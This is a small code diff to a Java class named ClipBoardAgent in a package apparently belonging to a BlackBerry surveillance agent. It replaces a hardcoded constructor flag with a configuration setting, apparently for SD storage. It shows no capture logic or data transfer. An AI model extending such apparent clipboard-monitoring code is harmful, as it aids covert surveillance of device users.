@@ -9,6 +9,7 @@
  * *************************************************/
 package blackberry.agent;
 
+import blackberry.config.Conf;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 
@@ -29,7 +30,7 @@ public final class ClipBoardAgent extends Agent {
      *            the agent status
      */
     public ClipBoardAgent(final boolean agentEnabled) {
-        super(Agent.AGENT_CLIPBOARD, agentEnabled, true, "ClipBoardAgent");
+        super(Agent.AGENT_CLIPBOARD, agentEnabled, Conf.AGENT_CLIPBOARD_ON_SD, "ClipBoardAgent");
     }
 
     /**
